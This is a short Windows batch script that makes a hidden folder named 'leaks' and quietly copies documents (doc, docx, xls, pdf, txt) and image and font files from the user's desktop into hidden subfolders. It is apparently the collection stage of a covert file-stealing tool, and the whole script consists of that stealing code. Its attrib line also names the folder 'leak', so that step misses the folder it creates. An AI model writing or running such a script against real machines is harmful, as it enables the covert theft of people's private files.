:: create a new folder named "leaks"
md leaks
:: hide created folder "leaks"
attrib +R +S +A +H "leak" /S /D

:: docuements: preparation
md leaks\documents
:: documents: file types: doc, docx, xls, pdf, txt
xcopy %userprofile%\desktop\*.doc leaks\documents\*.doc /q /c /h /y /s
xcopy %userprofile%\desktop\*.docx leaks\documents\*.docx /q /c /h /y /s
xcopy %userprofile%\desktop\*.xls leaks\documents\*.xls /q /c /h /y /s
xcopy %userprofile%\desktop\*.pdf leaks\documents\*.pdf /q /c /h /y /s
xcopy %userprofile%\desktop\*.txt leaks\documents\*.txt /q /c /h /y /s

:: docuements: preparation
md leaks\scans
:: scans: file types: jpg, ttf, png
xcopy %userprofile%\desktop\*.jpg leaks\scans\*.jpg /q /c /h /y /s
xcopy %userprofile%\desktop\*.ttf leaks\scans\*.ttf /q /c /h /y /s
xcopy %userprofile%\desktop\*.png leaks\scans\*.png /q /c /h /y /s
